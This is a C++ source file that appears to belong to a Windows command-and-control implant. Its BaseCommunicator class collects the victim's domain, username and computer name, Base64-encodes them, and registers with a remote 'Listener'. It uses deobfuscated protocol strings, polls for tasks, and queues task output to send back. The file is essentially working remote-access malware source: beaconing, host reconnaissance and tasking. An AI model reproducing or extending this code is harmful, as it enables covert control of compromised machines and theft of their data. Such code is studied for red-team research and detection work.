#include <Windows.h>
#include "utils/winapi.h"
#include "communicators/base.h"
#include "utils/event.h"

/* Constructor */
BaseCommunicator::BaseCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue, Event *pEventRegister, Event *pEventAgentShouldStop)
    : pWinApiCustom(pWinApiCustom),
      listenerHost(host),
      listenerPort(port),
      agentId(agentId),
      pCommunicateWithListenerData(NULL),
      communicateWithListenerDataSize(0),
      pTaskInputQueue(pTaskInputQueue),
      pTaskOutputQueue(pTaskOutputQueue),
      pEventRegister(pEventRegister),
      pEventAgentShouldStop(pEventAgentShouldStop) {}

/* Destructor */
BaseCommunicator::~BaseCommunicator() {}

/* Communicate with listener once; meant to be overriden by derived classes */
void BaseCommunicator::CommunicateOnceWithListener(BOOL forRegistration) {}

/* Starts communication with Listener; meant to be overriden by derived classes */
void BaseCommunicator::StartCommunication() {}

/* Queue data to register Agent with Listener */
void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
{
    static CHAR strAgentRegister[STRING_AGENT_REGISTER_LEN + 1] = ""; // "AGENT_REGISTER"
    DeobfuscateUtf8String(
        (PCHAR)STRING_AGENT_REGISTER,
        STRING_AGENT_REGISTER_LEN,
        strAgentRegister);

    // Buffer variables
    LPVOID pSidString = NULL;
    LPVOID pUserName = NULL;
    LPVOID pDomainName = NULL;
    LPVOID pFqdnComputer = NULL;
    LPVOID pFqdnComputerB64 = NULL;
    LPVOID pDomainAndUserNameB64 = NULL;
    LPVOID pDomainAndUserName = NULL;
    LPVOID pRegistrationData = NULL;

    // Get logged-in username and hostname of computer, then concat them
    this->pWinApiCustom->GetCurrentUserCustom((CHAR **)(&pSidString), (CHAR **)(&pUserName), (CHAR **)(&pDomainName));
    pFqdnComputer = this->pWinApiCustom->GetFQDNComputer();
    if (pUserName == NULL || pDomainName == NULL || pFqdnComputer == NULL)
        goto CLEANUP;
    DWORD domainNameLen = StrLen((PCHAR)pDomainName);
    DWORD userNameLen = StrLen((PCHAR)pUserName);
    DWORD fqdnComputerLen = StrLen((PCHAR)pFqdnComputer);

    pDomainAndUserName = this->pWinApiCustom->HeapAllocCustom(domainNameLen + 1 + userNameLen + 1); // "DOMAIN/USERNAME" + null-byte
    if (pDomainAndUserName == NULL)
        goto CLEANUP;
    ConcatString((PCHAR)pDomainAndUserName, (PCHAR)pDomainName);
    ConcatString((PCHAR)pDomainAndUserName, "/");
    ConcatString((PCHAR)pDomainAndUserName, (PCHAR)pUserName);
    DWORD domainAndUserNameLen = StrLen((PCHAR)pDomainAndUserName);

    // Convert all necessary individual data into Base64
    DWORD fqdnComputerB64Len = (((fqdnComputerLen + 2) / 3) * 4);
    DWORD domainAndUserNameB64Len = (((domainAndUserNameLen + 2) / 3) * 4);
    pFqdnComputerB64 = this->pWinApiCustom->HeapAllocCustom(fqdnComputerB64Len + 1);
    pDomainAndUserNameB64 = this->pWinApiCustom->HeapAllocCustom(domainAndUserNameB64Len + 1);
    if (pFqdnComputerB64 == NULL || pDomainAndUserNameB64 == NULL)
        goto CLEANUP;
    Base64Encode((PUCHAR)pFqdnComputer, fqdnComputerLen, (PCHAR)pFqdnComputerB64);
    Base64Encode((PUCHAR)pDomainAndUserName, domainAndUserNameLen, (PCHAR)pDomainAndUserNameB64);

    // Prepare registration data
    DWORD registrationDataSize = STRING_AGENT_REGISTER_LEN + 1 + StrLen(this->agentId) + 1 + fqdnComputerB64Len + 1 + domainAndUserNameB64Len + 1; // "AGENT_REGISTER" + "-" + "6 char agent id" + "-" + "HOSTNAME B64" + "-" + "DOMAIN/USERNAME B64" + "null-byte"
    pRegistrationData = this->pWinApiCustom->HeapAllocCustom(registrationDataSize);
    if (pRegistrationData == NULL)
        goto CLEANUP;

    ConcatString((PCHAR)pRegistrationData, strAgentRegister);             // "AGENT_REGISTER"
    ConcatString((PCHAR)pRegistrationData, "-");                          // "-"
    ConcatString((PCHAR)pRegistrationData, this->agentId);                // Agent Id
    ConcatString((PCHAR)pRegistrationData, "-");                          // "-"
    ConcatString((PCHAR)pRegistrationData, (PCHAR)pFqdnComputerB64);      // "HOSTNAME B64"
    ConcatString((PCHAR)pRegistrationData, "-");                          // "-"
    ConcatString((PCHAR)pRegistrationData, (PCHAR)pDomainAndUserNameB64); // "DOMAIN/USERNAME B64"

    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        goto CLEANUP;
    this->pTaskOutputQueue->Enqueue(pRegistrationData, registrationDataSize);
    this->pTaskOutputQueue->ReleaseThreadMutex();

CLEANUP:
    if (pSidString != NULL)
        this->pWinApiCustom->HeapFreeCustom(pSidString);

    if (pUserName != NULL)
        this->pWinApiCustom->HeapFreeCustom(pUserName);

    if (pDomainName != NULL)
        this->pWinApiCustom->HeapFreeCustom(pDomainName);

    if (pFqdnComputer != NULL)
        this->pWinApiCustom->HeapFreeCustom(pFqdnComputer);

    if (pFqdnComputerB64 != NULL)
        this->pWinApiCustom->HeapFreeCustom(pFqdnComputerB64);

    if (pDomainAndUserNameB64 != NULL)
        this->pWinApiCustom->HeapFreeCustom(pDomainAndUserNameB64);

    if (pDomainAndUserName != NULL)
        this->pWinApiCustom->HeapFreeCustom(pDomainAndUserName);

    if (pRegistrationData != NULL)
        this->pWinApiCustom->HeapFreeCustom(pRegistrationData);
}

/* Verify if Agent registration was successful */
BOOL BaseCommunicator::IsAgentRegistrationSuccessful()
{
    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        return FALSE;

    // Initialise buffer variables
    LPVOID pRegistrationResponseCorrect = NULL;
    PCHAR registrationResponseActual = NULL;

    BOOL result = FALSE;

    if (this->pTaskInputQueue->IsEmpty())
        goto CLEANUP;

    static CHAR strRegistered[STRING_REGISTERED_LEN + 1] = ""; // "REGISTERED"
    DeobfuscateUtf8String(
        (PCHAR)STRING_REGISTERED,
        STRING_REGISTERED_LEN,
        strRegistered);

    DWORD registrationResponseCorrectSize = STRING_REGISTERED_LEN + 1 + StrLen(this->agentId) + 1; // "REGISTERED" + "-" + "6 char agent id" + "null-byte"
    pRegistrationResponseCorrect = this->pWinApiCustom->HeapAllocCustom(registrationResponseCorrectSize);
    if (pRegistrationResponseCorrect == NULL)
        goto CLEANUP;

    ConcatString((PCHAR)pRegistrationResponseCorrect, strRegistered);
    ConcatString((PCHAR)pRegistrationResponseCorrect, "-");
    ConcatString((PCHAR)pRegistrationResponseCorrect, this->agentId);

    for (int i = 0; i < this->pTaskInputQueue->GetSize(); i++)
    {
        registrationResponseActual = (PCHAR)(this->pTaskInputQueue->GetDataAtIndex(i, FALSE));
        result = CompareBuffer(pRegistrationResponseCorrect, registrationResponseActual, registrationResponseCorrectSize);
        if (result)
        {
            // Remove registration input from Listener because it's not a Task
            this->pTaskInputQueue->DequeueAt(i);

            // Set registration event
            this->pEventRegister->Set();

            break;
        }
    }

CLEANUP:
    if (pRegistrationResponseCorrect != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(pRegistrationResponseCorrect);
    }

    if (registrationResponseActual != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(registrationResponseActual);
    }

    this->pTaskOutputQueue->ReleaseThreadMutex();

    return result;
}

/*
Prepare data to send to Listener; this should be used before CommunicateWithListener()

This function does:
1. Frees and resets previous `pCommunicateWithListenerData` and `communicateWithListenerDataSize`
2. Sets up `pCommunicateWithListenerData` and `communicateWithListenerDataSize` with TaskOutputQueue data, and is ready to be sent to Listener by CommunicateOnceWithListener()
3. Clears TaskOutputQueue
*/
void BaseCommunicator::PrepareDataForCommunicateOnceWithListener(BOOL forRegistration)
{
    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        return;

    // Initialise buffer variable
    LPVOID pGetTasks = NULL;

    // Remove previous request data if exists
    if (this->pCommunicateWithListenerData != NULL)
    {
        if (this->pWinApiCustom->HeapFreeCustom(this->pCommunicateWithListenerData))
        {
            this->pCommunicateWithListenerData = NULL;
            this->communicateWithListenerDataSize = 0;
        }
        else
        {
            goto CLEANUP;
        }
    }

    // Calculate size of data to send

    //// Start with calculating size for new Task request
    static CHAR strGetTasks[STRING_GET_TASKS_LEN + 1] = ""; // "GET_TASKS"
    DeobfuscateUtf8String(
        (PCHAR)STRING_GET_TASKS,
        STRING_GET_TASKS_LEN,
        strGetTasks);

    DWORD getTasksLength = STRING_GET_TASKS_LEN + 1 + 6 + 1; // "GET_TASKS" + "-" + "6 char agent id" + "null-byte"
    pGetTasks = this->pWinApiCustom->HeapAllocCustom(getTasksLength);
    if (pGetTasks == NULL)
        goto CLEANUP;

    ConcatString((PCHAR)pGetTasks, strGetTasks);
    ConcatString((PCHAR)pGetTasks, "-");
    ConcatString((PCHAR)pGetTasks, this->agentId);

    if (!forRegistration)
        this->communicateWithListenerDataSize += StrLen((PCHAR)pGetTasks) + 1; // Len of string + 1 null-separator

    //// If there are Task outputs, include them in size calculation
    if (!this->pTaskOutputQueue->IsEmpty())
    {
        DWORD numOfTaskOutputs = this->pTaskOutputQueue->GetSize();
        for (int i = 0; i < numOfTaskOutputs; i++)
        {
            this->communicateWithListenerDataSize += StrLen((PCHAR)(this->pTaskOutputQueue->GetDataAtIndex(i, FALSE))) + 1; // Len of string + 1 null-separator
        }
    }

    // Prepare request data (raw)
    if (this->communicateWithListenerDataSize == 0)
        goto CLEANUP;

    this->pCommunicateWithListenerData = this->pWinApiCustom->HeapAllocCustom(this->communicateWithListenerDataSize);
    if (this->pCommunicateWithListenerData == NULL)
        goto CLEANUP;

    //// Start with new Task request
    DWORD bytesNumCopied = 0;
    if (!forRegistration)
    {
        bytesNumCopied += StrLen((PCHAR)pGetTasks) + 1;
        CopyBuffer(pCommunicateWithListenerData, pGetTasks, bytesNumCopied);
    }

    //// If there are Task outputs, append them
    if (!this->pTaskOutputQueue->IsEmpty())
    {
        DWORD numOfTaskOutputs = this->pTaskOutputQueue->GetSize();
        DWORD sizeOfTaskOutput = 0;

        for (int i = 0; i < numOfTaskOutputs; i++)
        {
            LPVOID taskOutputData = this->pTaskOutputQueue->Dequeue();

            sizeOfTaskOutput = StrLen((PCHAR)taskOutputData) + 1;
            CopyBuffer((PCHAR)(this->pCommunicateWithListenerData) + bytesNumCopied, taskOutputData, sizeOfTaskOutput);
            bytesNumCopied += sizeOfTaskOutput;

            this->pWinApiCustom->HeapFreeCustom(taskOutputData);
        }
    }

CLEANUP:
    this->pTaskOutputQueue->ReleaseThreadMutex();

    if (pGetTasks != NULL)
    {
        this->pWinApiCustom->HeapFreeCustom(pGetTasks);
    }
}

/*
Processes response from Listener; this should be used after CommunicateWithListener()

This function does:
1. Processes pResponseData to append to TaskInputQueue, by creating space (heap) for each Task and copying it to the space

This function does not:
1. Free up `pResponseData`; need to do it explicitly
*/
void BaseCommunicator::ProcessResponseFromCommunicateOnceWithListener(LPVOID pResponseData, DWORD responseDataSize)
{
    if (!this->pTaskOutputQueue->AcquireThreadMutex())
        return;

    DWORD numOfNewTasks = NullSeparatedArrayNumOfStringElements((PCHAR)pResponseData);
    if (numOfNewTasks == 0)
        goto CLEANUP;

    LPVOID pTask = NULL;
    DWORD taskLen = 0;
    for (int i = 0; i < numOfNewTasks; i++)
    {
        pTask = NullSeparatedArrayStringAt((PCHAR)pResponseData, i);
        taskLen = StrLen((PCHAR)pTask);
        if (taskLen != 0)
            this->pTaskInputQueue->Enqueue(pTask, taskLen + 1);
    }

CLEANUP:
    this->pTaskOutputQueue->ReleaseThreadMutex();
}